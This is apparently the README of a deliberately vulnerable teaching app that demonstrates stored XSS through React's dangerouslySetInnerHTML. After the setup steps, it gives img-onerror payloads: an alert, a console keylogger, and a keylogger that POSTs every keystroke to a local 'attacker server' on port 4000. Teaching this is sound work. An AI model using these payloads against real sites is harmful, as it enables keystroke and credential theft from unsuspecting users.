# XSS Vulnerable Demo

## Running the Frontend

1. Open a terminal in the project root and navigate to the `frontend` folder:
   ```bash
   cd frontend
   ```
2. Install dependencies:
   ```bash
   npm install
   ```
3. Start the development server:
   ```bash
   npm run dev
   ```
4. Open your browser at `http://localhost:3000`

## XSS Alert Example

1. Click **Add New Note**.
2. In the **Content** textarea, paste:
   ```html
   <img src="nonexistent.jpg" onerror="alert('XSS!')">
   ```
3. Click **Save**.
4. You should see a JavaScript alert with the message `XSS`.

## Keylogger Demo (with Attacker Server)

To capture keystrokes and send them to console.log, paste the following into the **Content** textarea:

```html
<img src="nonexistent.jpg"
     onerror="
       if (!window.myLogger) {
         window.myLogger = function(e){
           console.log('key pressed:', e.key);
         };
         document.addEventListener('keydown', window.myLogger);
       }
     ">
```

To capture keystrokes and send them to a malicious server running on port **4000**, paste the following into the **Content** textarea:

```html
<img src="nonexistent.jpg" onerror="
  if (!window.myLogger) {
    window.myLogger = e => fetch('http://localhost:4000/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ key: e.key })
    });
    document.addEventListener('keydown', window.myLogger);
  }
">
```

1. Ensure any “sanitize” toggle is **off** so the code isn’t filtered.
2. Click **Save**.
3. Server edition: Open DevTools → **Network** to see POST requests to `http://localhost:4000/log` each time you press a key.
4. Console edition: Open DevTools → **Console** , make sure you're focused on the page, each key press will log a key pressed: <key> message.

---

*Note:* This demo intentionally uses `dangerouslySetInnerHTML` to show how injecting HTML can lead to XSS and data theft.

